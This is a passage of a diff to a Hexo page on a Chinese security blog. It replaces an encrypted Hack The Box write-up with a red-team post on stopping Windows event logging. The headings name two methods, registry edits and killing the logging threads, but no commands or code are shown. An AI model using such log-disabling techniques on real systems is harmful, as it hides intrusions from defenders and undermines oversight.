@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Hack The Box - Traverxec | 九世的博客</title>
-  <meta name="keywords" content=" htb ">
-  <meta name="description" content="Hack The Box - Traverxec | 九世的博客">
+  <title>停止windows日志记录研究 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="停止windows日志记录研究 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1742,9 +1742,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Hack-The-Box-Traverxec" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-停止windows日志记录研究" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Hack The Box - Traverxec</h1>
+        <h1 class="article-title">停止windows日志记录研究</h1>
     
     <div class="article-meta">
         
@@ -1753,14 +1753,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color4">htb</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-12-15 00:48:24">2019-12-14 23:46</time>
+        创建时间:<time class="date" title="更新时间: 2021-05-18 12:19:23">2021-05-18 12:09</time>
         
     </div>
     <div class="article-meta">
@@ -1782,7 +1782,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#方法一-注册表修改永久停止日志记录"><span class="toc-text">方法一:注册表修改永久停止日志记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法二-停止记录日志记录的线程"><span class="toc-text">方法二:停止记录日志记录的线程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1797,20 +1797,172 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-<div id="hbe-security">
-  <div class="hbe-input-container">
-  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog.">
-    <label for="pass">Please enter the password to read the blog.</label>
-    <div class="bottom-line"></div>
-  </div>
-</div>
-<div id="decryptionError" style="display: none;">Incorrect Password!</div>
-<div id="noContentError" style="display: none;">No content to display!</div>
-<div id="encrypt-blog" style="display:none">
-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